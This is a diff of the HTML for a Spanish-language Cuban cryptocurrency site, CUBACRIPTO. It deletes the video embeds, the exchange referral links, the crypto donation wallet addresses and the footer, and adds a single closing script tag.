-    <iframe width="99%" height="190" src="https://www.youtube.com/embed/2l840KATggg" title="La criptomoneda - Pasaje a lo Desconocido" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
-  </div>
-  <div class="mobile-youtube-player">
-    <iframe width="99%" height="190" src="https://www.youtube.com/embed/ieHDiPx9u4E" title="Las criptomonedas - Pasaje a lo Desconocido" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
-  </div>
-  <div class="mobile-youtube-player">
-    <iframe width="99%" height="190" src="https://www.youtube.com/embed/-HBoELffdFw" title="Bitcoin evita bloqueos en Cuba" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
-  </div>
-</div>
-<!-- /interest -->
-
-<!-- recomendations -->
-<center>
- <div class="horizontal-bar">
-  <h2>RECOMENDACIONES</h2>
- </div>
-</center>
-
-<br>
-
-<style>
-.recomendations {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(125px, 1fr));
-  grid-gap: 10px;
-  justify-content: center;
-  align-items: center;
-  margin: 0 auto;
-  max-width: 100%;
-  padding: 0 50px;
-}
-.recomendations img {
-  max-width: 90%;
-  height: auto;
-  transition: transform 0.3s;
-}
-.recomendations img:hover {
-  transform: scale(1.1);
-}
-</style>
-
-<div class="recomendations">
-
- <div>
-  <a href="https://www.binance.com/es/activity/referral-entry/CPA?ref=CPA_00SYAOLECQ" target="_blank">
-   <img src="rs/binance.png">
-  </a>
- </div>
-
- <div>
-  <a href="https://bingx.com/invite/93QRNV" target="_blank">
-   <img src="rs/bingx.png">
-  </a>
- </div>
-
- <div>
-  <a href="https://www.kucoin.com/ucenter/signup?rcode=vMuJsu" target="_blank">
-   <img src="rs/kucoin.png">
-  </a>
- </div>
-
- <div>
-  <a href="https://www.pionex.com/sign/ref/AJbKLGfM" target="_blank">
-   <img src="rs/pionex.png">
-  </a>
- </div>
-
-</div>
-
-<br>
-
-<div class="recomendations">
-  
- <div>
-  <a href="https://www.bitget.com/es/referral/register?from=referral&clacCode=HYKXDDYF" target="_blank">
-   <img src="rs/bitget.png">
-  </a>
- </div>
-
- <div>
-  <a href="https://www.gate.io/signup/VVcWVVAM?ref_type=103" target="_blank">
-   <img src="rs/gate.png">
-  </a>
- </div>
-
-<div>
-  <a href="https://weex.com/register?vipCode=5z9hn" target="_blank">
-   <img src="rs/weex.png">
-  </a>
- </div>
-
- <div>
-  <a href="https://www.coinex.com/register?refer_code=u2mdr" target="_blank">
-   <img src="rs/coinex.png">
-  </a>
- </div>
-
-</div>
-<!-- /recomendations -->
-
-<br>
-
-<!-- donate -->
-<center>
- <div class="horizontal-bar">
-  <h2>DONAR</h2>
- </div>
-</center>
-
-<br>
-
-<style>
-.donate {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(125px, 1fr));
-  grid-gap: 10px;
-  justify-content: center;
-  align-items: center;
-  margin: 0 auto;
-  max-width: 100%;
-  padding: 0 30px;
-}
-.donate img {
-  max-width: 90%;
-  height: auto;
-  transition: transform 0.3s;
-}
-.donate img:hover {
-  transform: scale(1.1);
-}
-.text-coin {
-  font-size: 15px;
-  text-decoration: none !important;
-  word-wrap: break-word;
-}
-.text-wallet {
-  font-size: 14px;
-  text-decoration: none !important;
-  word-wrap: break-word;
-}
-</style>
-
-<div class="donate">
-
- <div>
-  <a href="https://link.trustwallet.com/send?coin=0&address=bc1qyzza6dn7pphxf4z8p3j3e36agnpljdlr5tyuyu" target="_blank">
-   <img src="rs/btc.png">
-  </a>
-   <p class="text-coin"><b>BTC</b></p>
-   <p class="text-wallet"><b>bc1qyzza6dn7pphxf4z8p3j3e36agnpljdlr5tyuyu</b></p>
- </div>
-
- <div>
-  <a href="https://link.trustwallet.com/send?coin=60&address=0x5130a834941F9CEd28B786f91b8d4FB2A774D965" target="_blank">
-   <img src="rs/eth.png">
-  </a>
-   <p class="text-coin"><b>ETH (ERC20)</b></p>
-   <p class="text-wallet"><b>0x5130a834941F9CEd28B786f91b8d4FB2A774D965</b></p>
- </div>
-
- <div>
-  <a href="https://link.trustwallet.com/send?coin=20000714&address=0x5130a834941F9CEd28B786f91b8d4FB2A774D965" target="_blank">
-   <img src="rs/bnb.png">
-  </a>
-   <p class="text-coin"><b>BSC/BNB (BEP20)</b></p>
-   <p class="text-wallet"><b>0x5130a834941F9CEd28B786f91b8d4FB2A774D965</b></p>
- </div>
-
- <div>
-  <a href="https://link.trustwallet.com/send?coin=195&address=TFDz7NMr3hpXo6kc6cv59oHTMjAVAvsdt2" target="_blank">
-   <img src="rs/trx.png">
-  </a>
-   <p class="text-coin"><b>TRON/TRX (TRC20)</b></p>
-   <p class="text-wallet"><b>TFDz7NMr3hpXo6kc6cv59oHTMjAVAvsdt2</b></p>
- </div>
-
- <div>
-  <a href="https://link.trustwallet.com/send?coin=501&address=ERwzA8GGVGESU5GZ2QwN12M5mH1EStGpypCTUXVKBcCn" target="_blank">
-   <img src="rs/sol.png">
-  </a>
-   <p class="text-coin"><b>SOL</b></p>
-   <p class="text-wallet"><b>ERwzA8GGVGESU5GZ2QwN12M5mH1EStGpypCTUXVKBcCn</b></p>
- </div>
-
- <div>
-  <a href="https://link.trustwallet.com/send?coin=966&address=0x5130a834941F9CEd28B786f91b8d4FB2A774D965" target="_blank">
-   <img src="rs/matic.png">
-  </a>
-   <p class="text-coin"><b>POLYGON/MATIC</b></p>
-   <p class="text-wallet"><b>0x5130a834941F9CEd28B786f91b8d4FB2A774D965</b></p>
- </div>
-
-</div>
-<!-- /donate -->
-
-<br>
-
-<!-- footer -->
-<style>
-footer {
-  background-color: #0000FF;
-  color: #FFFFFF;
-  padding: 15px;
-  text-align: center;
-}
-</style>
-
-<footer>
-
-<!-- logo2 -->
-<style>
-.logo2 {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-.logo2 img {
-  width: auto;
-  height: 30px;
-  transition: transform 0.3s;
-}
-.logo2 img:hover {
-  transform: scale(1.1);
-}
-</style>
-
-<center>
-<div class="logo2">
- <a href="index.html">
-  <img src="rs/cc22.png">
- </a>
-</div>
-</center>
-<!-- /logo2 -->
-
-<br>
-
-<!-- social -->
-<style>
-.social-container {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-.social-container img {
-  width: auto;
-  height: 25px;
-  transition: transform 0.3s;
-}
-.social-wrapper {
-  margin-right: 15px;
-}
-.social-wrapper:last-child {
-  margin-right: 0;
-}
-.social-image:hover {
-  transform: scale(1.2);
-}
-</style>
-
-<div class="social"></div>
-
- <div class="social-container">
-
-  <div class="social-wrapper">
-   <a href="https://t.me/cubacripto" target="_blank">
-    <img class="social-image" src="rs/tg1.png">
-   </a>
-  </div>
-
-  <div class="social-wrapper">
-   <a href="https://x.com/cubacripto" target="_blank">
-    <img class="social-image" src="rs/x1.png">
-   </a>
-  </div>
-
-  <div class="social-wrapper">
-   <a href="https://facebook.com/cubacripto" target="_blank">
-    <img class="social-image" src="rs/fb1.png">
-   </a>
-  </div>
-
-  <div class="social-wrapper">
-   <a href="https://instagram.com/cubacripto" target="_blank">
-    <img class="social-image" src="rs/ig1.png">
-   </a>
-  </div>
-
-  <div class="social-wrapper">
-   <a href="https://www.youtube.com/@cubacripto" target="_blank">
-    <img class="social-image" src="rs/yt1.png">
-   </a>
-  </div>
-
-  <div class="social-wrapper">
-   <a href="mailto:cubacripto@gmail.com" target="_blank">
-    <img class="social-image" src="rs/em1.png">
-   </a>
-  </div>
-
- </div>
-<!-- /social -->
-
-<br>
-
-<!-- copyright -->
-<center>
-<font size="2"><b>&copy; 2018-2026 CUBACRIPTO<b/></font>
-</center>
-<center>
-<font size="1"><b><i>Update: 2512120612</i><b/></font>
-</center>
-<!-- /copyright -->
-
-<br>
-
-</footer>
-<!-- /footer -->
-
+</script>
 </body>
-<!-- /body -->
-
 </html>
